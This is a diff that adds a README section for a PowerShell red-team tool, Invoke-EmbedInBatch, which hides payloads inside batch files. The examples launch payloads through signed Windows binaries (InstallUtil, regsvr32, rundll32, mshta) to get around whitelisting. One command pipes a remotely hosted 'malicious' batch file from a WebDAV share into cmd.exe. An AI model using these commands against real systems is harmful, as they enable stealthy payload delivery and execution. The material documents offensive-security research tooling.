@@ -5,6 +5,21 @@ Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)
 
 This repository aims at publishing some of PowerShell scripts. No rocket science, just a few scripts I created either to learn PowerShell or to fit basic needs in my security veil.
 
+Invoke-EmbedInBatch
+----------------
+Inspired by @xorrior, this scripts embeds and hide any type of payload within a batch file and then executes it given a command line specified as an argument.
+Examples:
+```
+Invoke-EmbedInBatch -PayloadPath installUtil.dll -FinalCommandLine "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U _payload_"
+Invoke-EmbedInBatch -PayloadPath regsvr32.sct -FinalCommandLine "regsvr32.exe /s /u /i:_payload_ scrobj.dll"
+Invoke-EmbedInBatch -PayloadPath standard.dll -FinalCommandLine "rundll32.exe _payload_,entrypoint"
+Invoke-EmbedInBatch -PayloadPath payload.hta -FinalCommandLine "mshta.exe _payload_"
+Invoke-EmbedInBatch -PayloadPath payload.exe -FinalCommandLine "_payload_"
+```
+
+The malicious batch file can then be executed locally on a target system, or even downloaded from a remote location with this command line:
+`cmd.exe /k < \\webdavserver\folder\malicious_batch.txt`
+
 Invoke-HideFileInLNK
 ----------------
 This script creates a specifically forged link file (.lnk) to embed any type of file in it, as per the technique described here:
